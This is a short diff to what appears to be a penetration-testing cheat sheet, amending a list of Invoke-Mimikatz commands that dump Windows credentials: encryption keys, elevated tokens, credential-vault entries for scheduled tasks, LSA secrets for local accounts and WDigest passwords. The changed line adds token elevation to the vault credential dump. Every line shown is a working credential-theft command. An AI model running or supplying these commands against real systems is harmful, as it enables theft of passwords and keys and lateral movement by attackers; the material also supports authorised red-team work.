@@ -164,7 +164,7 @@ Physmem2profit
 
 Invoke-Mimikatz -command '"sekurlsa::ekeys"'
 Invoke-Mimikatz -Command '"token::elevate" "privilege::debug" "sekurlsa::ekeys"'
-Invoke-Mimikatz -Command vault::cred /patch   //Scheduled tasks
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' //Scheduled tasks
 Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
 
 Invoke-Mimikatz -Command sekurlsa::wdigest
